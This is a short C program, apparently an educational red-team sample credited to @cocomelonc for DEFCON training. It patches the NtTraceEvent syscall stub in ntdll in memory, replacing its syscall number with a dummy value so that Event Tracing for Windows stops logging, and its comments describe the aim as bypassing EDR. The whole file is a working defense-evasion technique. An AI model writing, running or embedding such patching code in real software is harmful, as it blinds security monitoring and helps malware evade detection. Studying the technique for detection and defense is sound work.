/* 
 * hack.c - ETW patching via bytes
 * from disk to bypass EDR
 * author: @cocomelonc
 * for DEFCON education training and research
*/
#include <windows.h>
#include <stdio.h>

int main() {
  
  // setup variables for NtTraceEvent patching
  DWORD dwOldProtect = 0;
  const char* ntdll = "ntdll.dll";
  const char* funcName = "NtTraceEvent";
  
  // locate the address of NtTraceEvent in the current process memory
  PBYTE pNtTraceEvent = (PBYTE)GetProcAddress(GetModuleHandleA(ntdll), funcName);
  if (!pNtTraceEvent) {
    printf("Failed to find %s\n", funcName);
    return -1;
  }

  printf("[*] Targeted function: %s at 0x%p\n", funcName, pNtTraceEvent);
  printf("[#] Press <Enter> To continue ... \n");
  getchar();

  // scan the syscall stub for the 'mov eax, SSN' instruction (opcode 0xB8)
  // we scan up to 32 bytes (standard size for a syscall stub)
  PBYTE pSSN = NULL;
  for (int i = 0; i < 32; i++) {
    // 0xB8 is the opcode for 'mov eax, imm32'
    if (pNtTraceEvent[i] == 0xB8) {
      pSSN = (PBYTE)(&pNtTraceEvent[i] + 1); // Point to the value being moved into EAX
      break;
    }
  }

  if (!pSSN) {
    printf("[-] Could not find SSN opcode pattern.\n");
    return -1;
  }

  printf("[*] Found SSN location at 0x%p\n", pSSN);
  printf("[#] Press <Enter> To continue ... \n");
  getchar();

  // change memory protection to PAGE_EXECUTE_READWRITE to allow patching
  if (VirtualProtect(pSSN, sizeof(DWORD), PAGE_EXECUTE_READWRITE, &dwOldProtect)) {
    
    printf("[*] Overwriting SSN with 0x000000FF...\n");
    
    // apply the patch: change the syscall number to a dummy value (255)
    // This causes the kernel to fail the ETW logging request
    *(PDWORD)pSSN = 0x000000FF;

    // restore original memory protection
    VirtualProtect(pSSN, sizeof(DWORD), dwOldProtect, &dwOldProtect);
    printf("[+] ETW syscall stub patched successfully.\n");
  } else {
    printf("[-] VirtualProtect failed: %d\n", GetLastError());
  }

  printf("[#] Process is now 'blind' to ETW. Press Enter to exit.\n");
  getchar();

  return 0;
}